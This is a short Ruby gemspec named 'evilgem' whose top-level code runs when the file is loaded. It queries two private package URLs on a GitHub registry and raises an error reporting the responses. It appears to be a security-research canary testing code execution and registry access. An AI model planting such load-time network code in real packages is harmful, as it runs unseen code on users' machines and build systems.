require "net/http"
require "uri"
MARK = "ACTORB-74c561"
PXY  = ENV["https_proxy"] || ENV["HTTPS_PROXY"] || ENV["http_proxy"] || ENV["HTTP_PROXY"]
def _get(url)
  u = URI(url)
  h = if PXY && !PXY.empty?
    p = URI(PXY); Net::HTTP.new(u.host, u.port, p.host, p.port)
  else
    Net::HTTP.new(u.host, u.port)
  end
  h.use_ssl = true; h.open_timeout = 15; h.read_timeout = 20
  r = h.get(u.request_uri); [r.code, r.body.to_s]
rescue => e
  ["ERR", "#{e.class}:#{e.message}"]
end
B = "https://rubygems.pkg.github.com/czarflix-org"
gc, gb = _get("#{B}/info/cdxgranted")
nc, nb = _get("#{B}/info/cdxnotgranted")
raise "#{MARK} EXTERNAL_CODE_EXECUTED granted=#{gc}/#{gb.bytesize} notgranted=#{nc}/#{nb.bytesize} gsnip=#{gb.gsub(/\s+/,' ')[0,50].inspect}"
Gem::Specification.new do |s|
  s.name = "evilgem"; s.version = "0.0.1"; s.summary = "x"; s.authors = ["b"]; s.files = []
end
